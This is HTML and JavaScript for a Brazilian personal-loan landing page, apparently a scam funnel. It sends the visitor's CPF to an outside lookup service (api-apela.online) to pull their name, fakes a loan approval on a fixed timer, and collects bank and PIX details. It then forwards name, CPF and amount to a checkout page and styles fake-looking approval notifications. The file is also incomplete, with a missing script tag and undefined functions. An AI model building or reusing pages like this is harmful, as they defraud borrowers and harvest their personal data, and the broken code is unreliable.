<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <title>Ágil - Empréstimo Pessoal</title>
  <meta name="description" content="Até R$ 50.000 com as menores taxas do mercado. Aprovação em minutos, PIX na hora. Simule grátis agora." />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --green: #16C764;
      --green2: #2ECC71;
      --green-light: #4ADE80;
      --dark: #0d1117;
      --dark2: #111111;
      --white: #ffffff;
      --slate-50: #f8fafc;
      --slate-100: #f1f5f9;
      --slate-200: #e2e8f0;
      --slate-300: #cbd5e1;
      --slate-400: #94a3b8;
      --slate-500: #64748b;
      --slate-600: #475569;
      --slate-700: #334155;
      --slate-800: #1e293b;
      --slate-900: #0f172a;
      --font: 'Plus Jakarta Sans', sans-serif;
    }
    html, body { height: 100%; font-family: var(--font); background: var(--white); color: var(--slate-900); -webkit-font-smoothing: antialiased; }
    body { min-height: 100dvh; display: flex; flex-direction: column; }
    #app { flex: 1; display: flex; flex-direction: column; min-height: 100dvh; }

    /* ---- HEADER ---- */
    .header {
      position: sticky; top: 0; z-index: 50; padding: 12px 20px;
      border-bottom: 1px solid var(--slate-200);
      background: var(--white);
      box-shadow: 0 1px 6px rgba(0,0,0,0.06);
      transition: all 0.3s;
    }
    .header.dark { background: var(--dark2); border-color: rgba(255,255,255,0.08); box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
    .header-inner { max-width: 430px; margin: 0 auto; display: flex; flex-direction: column; gap: 14px; }
    .header-row { display: flex; justify-content: space-between; align-items: center; }
    .logo { height: 22px; width: auto; }
    .badge-gratuito { display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); padding: 6px 12px; border-radius: 999px; }
    .badge-gratuito .dot { width: 8px; height: 8px; background: var(--green-light); border-radius: 50%; }
    .badge-gratuito span { font-size: 10px; font-weight: 900; color: white; }
    .progress-bar { width: 100%; height: 6px; background: var(--slate-100); border-radius: 999px; overflow: hidden; }
    .progress-fill { height: 100%; background: linear-gradient(90deg, var(--green), #86EFAC); border-radius: 999px; transition: width 0.6s cubic-bezier(0.16,1,0.3,1); box-shadow: 0 0 10px rgba(34,197,94,0.4); }

    /* ---- MAIN CONTENT ---- */
    .main { flex: 1; max-width: 430px; margin: 0 auto; width: 100%; padding: 16px 16px 80px; display: flex; flex-direction: column; position: relative; z-index: 10; }

    /* ---- STEPS ---- */
    .step { animation: stepIn 0.35s cubic-bezier(0.16,1,0.3,1) both; }
    @keyframes stepIn { from { opacity:0; transform: translateY(16px); } to { opacity:1; transform: translateY(0); } }
    @keyframes stepOut { from { opacity:1; transform: translateY(0); } to { opacity:0; transform: translateY(-16px); } }
    .step.leaving { animation: stepOut 0.25s ease both; }

    /* ---- DARK CARD ---- */
    .dark-card { background: linear-gradient(135deg, #0d1117 0%, #071a0f 100%); border-radius: 24px; overflow: hidden; position: relative; margin-bottom: 16px; }
    .dark-card::before { content:''; position:absolute; top:0; left:0; width:100%; height:2px; background: linear-gradient(90deg, transparent, var(--green), transparent); }
    .dark-card-body { padding: 24px; text-align: center; }
    .dark-card-icon { width: 56px; height: 56px; border-radius: 16px; background: rgba(22,199,100,0.15); border: 1px solid rgba(22,199,100,0.25); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
    .dark-card-eyebrow { font-size: 10px; font-weight: 900; color: var(--green); text-transform: uppercase; letter-spacing: 0.2em; margin-bottom: 4px; }
    .dark-card-title { font-size: 1.3rem; font-weight: 900; color: white; line-height: 1.2; }
    .dark-card-sub { font-size: 11px; color: rgba(255,255,255,0.4); font-weight: 500; margin-top: 6px; line-height: 1.5; }
    .dark-card-info { display: inline-flex; align-items: center; gap: 8px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 8px 12px; margin-top: 16px; }
    .dark-card-info span { font-size: 10px; color: rgba(255,255,255,0.5); font-weight: 500; }
    .dark-card-info strong { color: rgba(255,255,255,0.8); }

    /* ---- WHITE CARD ---- */
    .white-card { background: white; border-radius: 20px; border: 2px solid var(--slate-100); padding: 16px; margin-bottom: 12px; }
    .white-card.selected { border-color: var(--green); background: linear-gradient(135deg, #f0fdf4, #ffffff); box-shadow: 0 8px 24px -8px rgba(22,199,100,0.35); }

    /* ---- BUTTONS ---- */
    .btn-primary { width: 100%; height: 56px; border-radius: 16px; font-weight: 900; color: white; font-size: 15px; display: flex; align-items: center; justify-content: center; gap: 8px; border: none; cursor: pointer; position: relative; overflow: hidden; font-family: var(--font); transition: transform 0.15s, box-shadow 0.15s; background: linear-gradient(135deg, #16C764 0%, #0ea855 100%); box-shadow: 0 8px 32px -8px rgba(22,199,100,0.5); }
    .btn-primary:active { transform: scale(0.98); }
    .btn-primary:hover::before { content:''; position:absolute; inset:0; background: rgba(255,255,255,0.1); }
    .btn-secondary { width:100%; padding: 12px; text-align:center; font-size:11px; color: var(--slate-400); background:none; border:none; cursor:pointer; font-family:var(--font); }
    .btn-secondary:hover { color: var(--slate-600); }

    /* ---- CPF INPUT ---- */
    .cpf-wrapper { position: relative; margin: 20px 0; }
    .cpf-label { font-size: 11px; font-weight: 700; color: var(--slate-500); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; display: block; }
    .cpf-input { width: 100%; height: 64px; border-radius: 16px; border: 2px solid var(--slate-200); font-size: 24px; font-weight: 800; font-family: var(--font); text-align: center; color: var(--slate-900); outline: none; transition: border-color 0.2s, box-shadow 0.2s; letter-spacing: 0.05em; background: white; }
    .cpf-input:focus { border-color: var(--green); box-shadow: 0 0 0 4px rgba(22,199,100,0.12); }
    .cpf-input.error { border-color: #ef4444; box-shadow: 0 0 0 4px rgba(239,68,68,0.1); }
    .cpf-input.valid { border-color: var(--green); }

    /* ---- HERO SECTION (step: input) ---- */
    .hero-amount { background: linear-gradient(135deg, var(--green) 0%, #0ea855 100%); border-radius: 20px; padding: 24px 20px; text-align: center; color: white; position: relative; overflow: hidden; margin-bottom: 20px; }
    .hero-amount::before { content:''; position:absolute; top:-30%; right:-10%; width:200px; height:200px; background: rgba(255,255,255,0.08); border-radius: 50%; }
    .hero-amount::after { content:''; position:absolute; bottom:-20%; left:-5%; width:150px; height:150px; background: rgba(255,255,255,0.06); border-radius: 50%; }
    .hero-amount-eyebrow { font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.15em; opacity: 0.8; margin-bottom: 4px; }
    .hero-amount-value { font-size: 2.5rem; font-weight: 900; line-height: 1; position: relative; z-index: 1; }
    .hero-amount-sub { font-size: 12px; opacity: 0.7; font-weight: 600; margin-top: 4px; position: relative; z-index: 1; }
    .hero-badges { display: flex; justify-content: center; gap: 16px; margin-top: 16px; position: relative; z-index: 1; }
    .hero-badge { display: flex; align-items: center; gap: 5px; font-size: 10px; font-weight: 700; opacity: 0.9; }

    /* ---- FEATURE ITEMS ---- */
    .feature-list { display: flex; flex-direction: column; gap: 10px; margin: 16px 0; }
    .feature-item { display: flex; align-items: flex-start; gap: 12px; background: white; border-radius: 16px; border: 2px solid var(--slate-100); padding: 14px 16px; box-shadow: 0 1px 4px rgba(0,0,0,0.04); }
    .feature-icon { width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
    .feature-title { font-size: 12px; font-weight: 900; color: var(--slate-700); }
    .feature-desc { font-size: 10px; color: var(--slate-400); font-weight: 500; margin-top: 2px; line-height: 1.4; }

    /* ---- SLIDER ---- */
    .slider-section { margin: 20px 0; }
    .slider-header { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px; }
    .slider-label { font-size: 11px; font-weight: 700; color: var(--slate-500); text-transform: uppercase; letter-spacing: 0.08em; }
    .slider-value { font-size: 22px; font-weight: 900; color: var(--slate-900); }
    input[type=range] { width: 100%; -webkit-appearance: none; height: 8px; border-radius: 999px; background: linear-gradient(90deg, var(--green) var(--pct, 50%), var(--slate-200) var(--pct, 50%)); outline: none; }
    input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 28px; height: 28px; border-radius: 50%; background: white; border: 3px solid var(--green); box-shadow: 0 4px 12px rgba(22,199,100,0.4); cursor: pointer; transition: transform 0.15s; }
    input[type=range]::-webkit-slider-thumb:active { transform: scale(1.2); }
    .slider-marks { display: flex; justify-content: space-between; margin-top: 6px; }
    .slider-mark { font-size: 10px; color: var(--slate-400); font-weight: 600; }

    /* ---- INSTALLMENTS GRID ---- */
    .install-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 16px 0; }
    .install-card { border-radius: 16px; border: 2px solid var(--slate-100); padding: 16px 12px; text-align: center; cursor: pointer; transition: all 0.2s; background: white; position: relative; overflow: hidden; }
    .install-card:hover { border-color: var(--slate-300); }
    .install-card.selected { border-color: var(--green); background: linear-gradient(135deg, #f0fdf4, #ffffff); box-shadow: 0 8px 24px -8px rgba(22,199,100,0.35); }
    .install-card.selected::before { content:''; position:absolute; top:0; left:0; width:100%; height:3px; background: linear-gradient(90deg, var(--green), var(--green-light)); }
    .install-number { font-size: 22px; font-weight: 900; color: var(--slate-400); }
    .install-card.selected .install-number { color: var(--green); }
    .install-label { font-size: 10px; font-weight: 700; color: var(--slate-500); margin-top: 2px; }
    .install-price { font-size: 12px; font-weight: 800; color: var(--slate-700); margin-top: 4px; }
    .install-card.selected .install-price { color: #111; }
    .install-check { position:absolute; top:8px; right:8px; width:16px; height:16px; border-radius:50%; background: var(--green); display:none; align-items:center; justify-content:center; }
    .install-card.selected .install-check { display:flex; }

    /* ---- LOADING SPINNER ---- */
    .loading-screen { display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:60vh; gap:20px; }
    .spinner { width:64px; height:64px; border-radius:50%; border:3px solid rgba(22,199,100,0.2); border-top-color: var(--green); animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-title { font-size: 1.1rem; font-weight: 900; color: var(--slate-800); }
    .loading-sub { font-size: 12px; color: var(--slate-400); font-weight: 500; text-align:center; max-width:240px; }

    /* ---- TRUST BADGES ---- */
    .trust-row { display:flex; justify-content:center; align-items:center; gap:16px; padding-top: 8px; }
    .trust-item { display:flex; align-items:center; gap:5px; font-size:10px; color:var(--slate-400); font-weight:600; }
    .trust-dot { width:3px; height:3px; background:var(--slate-300); border-radius:50%; }

    /* ---- NOTIFICATION TOASTS ---- */
    .notifications { position:fixed; bottom:80px; left:0; right:0; pointer-events:none; z-index:200; display:flex; flex-direction:column; gap:6px; padding: 0 16px; }
    .notif { display:flex; align-items:center; gap:10px; padding: 10px 14px; border-radius: 16px; backdrop-filter: blur(12px); border: 1px solid; max-width: 280px; margin: 0 auto; animation: notifIn 0.4s ease both, notifOut 0.4s ease 4s both; }
    .notif.approved { background: rgba(13,26,16,0.95); border-color: rgba(22,199,100,0.25); box-shadow: 0 8px 20px rgba(22,199,100,0.15); }
    .notif.denied { background: rgba(26,13,13,0.95); border-color: rgba(239,68,68,0.25); }
    @keyframes notifIn { from { opacity:0; transform:translateY(10px) scale(0.95); } to { opacity:1; transform:none; } }
    @keyframes notifOut { from { opacity:1; } to { opacity:0; } }
    .notif-icon { width:32px; height:32px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
    .notif.approved .notif-icon { background:rgba(22,199,100,0.2); }
    .notif.denied .notif-icon { background:rgba(239,68,68,0.2); }
    .notif-name { font-size:11px; font-weight:900; color:white; }
    .notif-city { font-size:10px; color:rgba(255,255,255,0.4); }
    .notif-amount { font-size:11px; font-weight:700; }
    .notif.approved .notif-amount { color:var(--green-light); }
    .notif.denied .notif-amount { color:#f87171; }
    .notif-pulse { width:6px; height:6px; border-radius:50%; margin-left:auto; flex-shrink:0; animation: pulse 2s infinite; }
    .notif.approved .notif-pulse { background: var(--green); }
    .notif.denied .notif-pulse { background: #f87171; }
    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }

    /* ---- BACKGROUND EFFECTS ---- */
    .bg-effects { position:fixed; inset:0; pointer-events:none; z-index:0; }
    .bg-glow-1 { position:absolute; top:-20%; right:0; width:500px; height:500px; background:rgba(46,204,113,0.05); border-radius:50%; filter:blur(60px); }
    .bg-glow-2 { position:absolute; top:10%; left:-10%; width:400px; height:400px; background:rgba(46,204,113,0.05); border-radius:50%; filter:blur(60px); }

    /* ---- FORM INPUT STYLES ---- */
    .form-group { margin-bottom: 16px; }
    .form-label { font-size: 11px; font-weight: 700; color: var(--slate-500); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 6px; display:block; }
    .form-input { width:100%; height:52px; border-radius:14px; border:2px solid var(--slate-200); font-size:15px; font-weight:600; font-family:var(--font); padding:0 16px; color:var(--slate-900); outline:none; transition:border-color 0.2s, box-shadow 0.2s; background:white; }
    .form-input:focus { border-color:var(--green); box-shadow:0 0 0 4px rgba(22,199,100,0.1); }
    .form-select { width:100%; height:52px; border-radius:14px; border:2px solid var(--slate-200); font-size:14px; font-weight:600; font-family:var(--font); padding:0 16px; color:var(--slate-900); outline:none; background:white; cursor:pointer; }
    .form-select:focus { border-color:var(--green); }

    /* ---- SUCCESS SCREEN ---- */
    .success-card { background: linear-gradient(135deg, #0d1117, #071a0f); border-radius: 24px; padding: 28px 24px; text-align:center; color:white; position:relative; overflow:hidden; margin-bottom:16px; }
    .success-card::before { content:''; position:absolute; top:0; left:0; width:100%; height:2px; background: linear-gradient(90deg, transparent, var(--green), transparent); }
    .success-amount-big { font-size: 2.8rem; font-weight: 900; color: var(--green-light); margin: 12px 0 4px; }
    .success-detail { background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); border-radius:12px; padding:12px 16px; display:flex; justify-content:space-between; margin:8px 0; }
    .success-detail-label { font-size:10px; color:rgba(255,255,255,0.4); font-weight:600; }
    .success-detail-value { font-size:12px; font-weight:800; color:white; }

    /* ---- DAYS GRID ---- */
    .days-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:16px 0; }
    .day-card { border-radius:16px; border:2px solid var(--slate-100); padding:20px 12px; text-align:center; cursor:pointer; transition:all 0.2s; background:white; position:relative; overflow:hidden; }
    .day-card.selected { border-color:var(--green); background:linear-gradient(135deg,#f0fdf4,#ffffff); box-shadow:0 8px 24px -8px rgba(22,199,100,0.35); }
    .day-card.selected::before { content:''; position:absolute; top:0; left:0; width:100%; height:3px; background:linear-gradient(90deg,var(--green),var(--green-light)); }
    .day-number { font-size:28px; font-weight:900; color:var(--slate-400); }
    .day-card.selected .day-number { color:var(--green); }
    .day-label { font-size:10px; font-weight:800; color:var(--slate-600); margin-top:4px; }
    .day-hint { font-size:9px; color:var(--slate-400); margin-top:2px; }
    .day-card.selected .day-hint { color:var(--green); }

    /* Scrollbar */
    ::-webkit-scrollbar { width:6px; } ::-webkit-scrollbar-track { background:transparent; } ::-webkit-scrollbar-thumb { background:var(--slate-200); border-radius:999px; }

    /* ---- Responsive ---- */
    @media (max-width:390px) { .hero-amount-value { font-size:2rem; } }

    /* ---- Info green box ---- */
    .info-green { display:flex; align-items:flex-start; gap:10px; background:#f0fdf4; border:1px solid rgba(22,199,100,0.2); border-radius:16px; padding:12px 16px; }
    .info-green p { font-size:10px; color:var(--slate-600); font-weight:500; line-height:1.5; }

    .space-y-4 > * + * { margin-top: 16px; }
    .space-y-3 > * + * { margin-top: 12px; }
    .space-y-2 > * + * { margin-top: 8px; }
    .hidden { display: none !important; }
    .text-center { text-align: center; }
    .mt-4 { margin-top: 16px; }
    .mt-3 { margin-top: 12px; }
    .mt-2 { margin-top: 8px; }
    .mb-4 { margin-bottom: 16px; }
    .mb-2 { margin-bottom: 8px; }

    /* ---- CPF HERO SCREEN ---- */
    .step-title { font-size: 1.4rem; font-weight: 900; color: var(--slate-900); letter-spacing: -0.02em; line-height: 1.2; margin-bottom: 6px; }
    .step-sub { font-size: 13px; color: var(--slate-500); font-weight: 500; line-height: 1.5; margin-bottom: 20px; }

    /* OTP style */
    .cpf-display { font-size: 2rem; font-weight: 900; letter-spacing: 0.08em; color: var(--slate-900); font-family: var(--font); }
    .cpf-cursor { display:inline-block; width:2px; height:32px; background:var(--green); margin-left:2px; vertical-align:middle; animation:blink 1s step-end infinite; }
    @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }

    /* ---- BANK SELECT ---- */
    .bank-search { width:100%; height:48px; border-radius:14px; border:2px solid var(--slate-200); font-size:14px; font-family:var(--font); padding:0 16px; color:var(--slate-900); outline:none; background:white; transition:border-color 0.2s; margin-bottom: 10px; }
    .bank-search:focus { border-color:var(--green); }
    .bank-list { max-height: 280px; overflow-y: auto; display:flex; flex-direction:column; gap:6px; }
    .bank-item { display:flex; align-items:center; gap:12px; padding:12px 16px; border-radius:14px; border:2px solid var(--slate-100); background:white; cursor:pointer; transition:all 0.15s; }
    .bank-item:hover { border-color:var(--slate-300); }
    .bank-item.selected { border-color:var(--green); background:#f0fdf4; }
    .bank-code { font-size:11px; font-weight:800; color:var(--slate-400); min-width:28px; }
    .bank-name { font-size:12px; font-weight:700; color:var(--slate-700); flex:1; }
    .bank-item.selected .bank-name { color: var(--slate-900); }
    .bank-check { display:none; }
    .bank-item.selected .bank-check { display:flex; width:18px; height:18px; border-radius:50%; background:var(--green); align-items:center; justify-content:center; }

    /* PIX KEY INPUT */
    .pix-types { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:16px; }
    .pix-type-btn { padding:10px; border-radius:12px; border:2px solid var(--slate-200); background:white; font-size:12px; font-weight:700; color:var(--slate-600); cursor:pointer; transition:all 0.15s; font-family:var(--font); text-align:center; }
    .pix-type-btn.active { border-color:var(--green); color: var(--green); background:#f0fdf4; }

    /* Camera overlay */
    .camera-overlay { position:fixed; inset:0; background:black; z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; }
    .camera-frame { width:256px; height:320px; border-radius:50%; border:3px solid rgba(22,199,100,0.5); position:relative; }
    .corner { position:absolute; width:20px; height:20px; border:2px solid var(--green); }
    .corner.tl { top:-2px; left:-2px; border-right:none; border-bottom:none; border-radius:4px 0 0 0; }
    .corner.tr { top:-2px; right:-2px; border-left:none; border-bottom:none; border-radius:0 4px 0 0; }
    .corner.bl { bottom:-2px; left:-2px; border-right:none; border-top:none; border-radius:0 0 0 4px; }
    .corner.br { bottom:-2px; right:-2px; border-left:none; border-top:none; border-radius:0 0 4px 0; }
  </style>

function formatCurrency(v) {
  return new Intl.NumberFormat('pt-BR', {style:'currency', currency:'BRL'}).format(v);
}
function formatCPF(v) {
  const d = v.replace(/\D/g,'');
  return d.replace(/(\d{3})(\d)/, '$1.$2')
          .replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3')
          .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
}
function validateCPF(c) {
  const d = c.replace(/\D/g,'');
  if(d.length !== 11) return false;
  if(/^(\d)\1+$/.test(d)) return false;
  let s = 0;
  for(let i=0;i<9;i++) s += parseInt(d[i])*(10-i);
  let r = (s*10)%11; if(r===10||r===11) r=0;
  if(r !== parseInt(d[9])) return false;
  s = 0;
  for(let i=0;i<10;i++) s += parseInt(d[i])*(11-i);
  r = (s*10)%11; if(r===10||r===11) r=0;
  return r === parseInt(d[10]);
}

// ==========================================
// EVENT HANDLERS
// ==========================================
function initStepEvents(step) {
  if(step === 'cpf') {
    const inp = document.getElementById('cpfInput');
    const btn = document.getElementById('btnContinuarCPF');
    inp.addEventListener('input', () => {
      const raw = inp.value.replace(/\D/g,'');
      inp.value = formatCPF(raw);
      state.cpf = raw;
      const valid = validateCPF(raw);
      btn.style.opacity = valid ? '1' : '0.5';
      btn.style.pointerEvents = valid ? 'auto' : 'none';
      if(valid) inp.classList.add('valid'); else inp.classList.remove('valid');
    });
    inp.focus();
  }
  if(step === 'valor') {
    const slider = document.getElementById('valorSlider');
    slider.addEventListener('input', () => {
      state.valor = parseInt(slider.value);
      const pct = ((state.valor - 1000) / (50000 - 1000)) * 100;
      slider.style.setProperty('--pct', pct+'%');
      document.getElementById('sliderValueDisplay').textContent = formatCurrency(state.valor);
    });
  }
  if(step === 'loading_cpf') {
    setTimeout(() => setStep('valor'), 2800);
  }
  if(step === 'loading_proposal') {
    setTimeout(() => setStep('approved'), 3500);
  }
  if(step === 'banco') {
    if(state.banco) {
      const btn = document.getElementById('btnBancoNext');
      if(btn) { btn.style.opacity='1'; btn.style.pointerEvents='auto'; }
    }
  }
  if(step === 'pix') {
    updatePixBtn();
  }
}

async function handleCPFSubmit() {
  if(!validateCPF(state.cpf)) return;
  setStep('loading_cpf');
  try {
    const raw = state.cpf.replace(/\D/g, '');
    const res = await fetch(`https://api-apela.online/?user=e2129a6b1eb9e84106863e47352dc1e5&cpf=${raw}`);
    const data = await res.json();
    if(data && (data.status === 200 || data.nome)) {
      state.nome = data.nome || '';
      state.cpfData = data;
      localStorage.setItem('cpf_data', JSON.stringify(data));
      if(data.nome) localStorage.setItem('user_name', data.nome);
    }
  } catch(e) {
    console.error('Erro na consulta do CPF:', e);
  }
}

function selectParcela(n) {
  state.parcelas = n;
  render();
}

function filterBanks() {
  const q = document.getElementById('bankSearch').value.toLowerCase();
  const filtered = BANKS.filter(b => b.name.toLowerCase().includes(q) || b.code.includes(q));
  document.getElementById('bankList').innerHTML = renderBankList(filtered);
}

function selectBanco(code, name) {
  state.banco = {code, name};
  const btn = document.getElementById('btnBancoNext');
  if(btn) { btn.style.opacity='1'; btn.style.pointerEvents='auto'; }
  document.querySelectorAll('.bank-item').forEach(el => el.classList.remove('selected'));
  event.currentTarget.classList.add('selected');
}

function handleBancoNext() {
  if(!state.banco) return;
  setStep('pix');
}

function selectPixType(type) {
  state.pixType = type;
  state.pixKey = '';
  render();
}

function updatePixBtn() {
  const btn = document.getElementById('btnPixNext');
  const inp = document.getElementById('pixInput');
  if(!btn || !inp) return;
  const valid = inp.value.trim().length > 3;
  btn.style.opacity = valid ? '1' : '0.5';
  btn.style.pointerEvents = valid ? 'auto' : 'none';
}

function handlePixNext() {
  const inp = document.getElementById('pixInput');
  if(!inp || inp.value.trim().length < 3) return;
  state.pixKey = inp.value.trim();
  setStep('conditions');
}

function goToCheckout() {
  const url = new URL(CHECKOUT_URL, window.location.origin);
  const params = new URLSearchParams(window.location.search);
  if (state.nome) params.set('name', state.nome);
  if (state.cpf) params.set('document', state.cpf);
  if (state.valor) params.set('loan_amount', String(state.valor));
  // Preserva UTMs e identificadores de clique já presentes na URL.
  const trackingKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid','gclid','ttclid','click_id'];
  trackingKeys.forEach(k => {
    const v = new URLSearchParams(window.location.search).get(k);
    if (v) params.set(k, v);
  });
  url.search = params.toString();
  window.location.href = url.toString();
}

function selectDay(day) {
  state.paymentDay = day;
  setTimeout(() => setStep('loading_proposal'), 220);
}

// ==========================================
// INIT
// ==========================================
function init() {
  // Detectar rota
  const path = window.location.pathname;
  if(path.includes('simulacao') || path === '/' || path.includes('index')) {
    setStep('cpf');
    startNotifications();
  } else {
    setStep('cpf');
    startNotifications();
  }
}

init();
</script>
